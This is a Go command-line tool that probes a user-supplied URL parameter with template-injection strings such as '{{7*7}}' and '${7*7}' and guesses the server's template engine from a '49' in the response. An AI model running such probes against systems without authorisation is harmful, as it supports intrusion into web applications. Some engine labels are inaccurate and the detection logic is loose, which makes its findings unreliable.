package main

import (
	"bufio"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"strings"
)

// Payloads with unique markers to identify the template engine
var payloads = map[string]string{
	"{{7*7}}":             "49", // Jinja2, Twig
	"${{7*7}}":            "49", // Go templates
	"${7*7}":              "49", // Velocity, Freemarker
	"<%= 7 * 7 %>":        "49", // ERB (Ruby)
	"{% 7 * 7 %}":         "49", // Django (no output for basic math)
	"<#assign x=7*7>${x}": "49", // Freemarker
	"#{7*7}":              "49", // Thymeleaf
}

// Mapping payloads to their respective template engines (unchanged)
var templateEngines = map[string]string{
	"{{7*7}}":             "Jinja2, Twig",
	"${{7*7}}":            "Go templates",
	"${7*7}":              "Velocity, Freemarker",
	"<%= 7 * 7 %>":        "ERB (Ruby)",
	"{% 7 * 7 %}":         "Django",
	"<#assign x=7*7>${x}": "Freemarker",
	"#{7*7}":              "Thymeleaf",
}

func main() {

	// Get the target URL from user input (unchanged)
	reader := bufio.NewReader(os.Stdin)
	fmt.Print("Enter the target URL🔗: ")
	url, _ := reader.ReadString('\n')
	url = strings.TrimSpace(url)

	fmt.Print("Enter the parameter to test (e.g., input): ")
	param, _ := reader.ReadString('\n')
	param = strings.TrimSpace(param)

	// Check SSTI for each payload and identify the template engine
	vulnerable := false
	for payload, expected := range payloads {
		if result, engine := checkSSTI(url, param, payload, expected); result != "" {
			vulnerable = true
			fmt.Printf("Potential SSTI detected with payload '%s'.\n", payload)
			fmt.Printf("Vulnerable URL: %s\n", result)
			fmt.Printf("Likely template engine(s): %s\n", engine)
		}
	}

	if !vulnerable {
		fmt.Println("The target does not appear to be vulnerable to SSTI.")
	}
}

func checkSSTI(url, param, payload, expected string) (string, string) {
	fullURL := fmt.Sprintf("%s?%s=%s", url, param, payload)
	resp, err := http.Get(fullURL)
	if err != nil {
		fmt.Println("Error:", err)
		return "", ""
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		fmt.Println("Error reading response:", err)
		return "", ""
	}

	bodyStr := string(body)
	if strings.Contains(bodyStr, expected) {
		engine := templateEngines[payload]
		return fullURL, engine
	}

	return "", ""
}
